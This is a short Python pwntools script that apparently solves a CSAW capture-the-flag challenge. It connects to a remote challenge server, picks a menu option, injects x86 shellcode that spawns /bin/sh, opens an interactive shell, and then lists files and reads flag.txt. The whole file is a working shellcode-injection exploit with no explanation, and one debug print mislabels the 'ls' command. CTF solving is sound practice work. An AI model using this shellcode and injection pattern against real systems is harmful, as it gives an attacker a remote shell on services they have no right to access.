#!/usr/bin/env python3

from pwn import *
from time import sleep

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

print("Not super reliable; if it hangs just do ^C and try running again\n")

p = remote('pwn.red.csaw.io',5000)


print(6)
p.sendline(b"6")

print(p.recv().decode())

print(p.recv())

sleep(.5)
print('shellcode')
p.sendline(shellcode)

print(p.recv())

p.interactive()

print('cat flag.txt')
p.sendline('ls')

print(p.recv().decode('ascii'))

print('cat flag.txt')
p.sendline('cat flag.txt')

print(p.recv().decode('ascii'))

p.close()
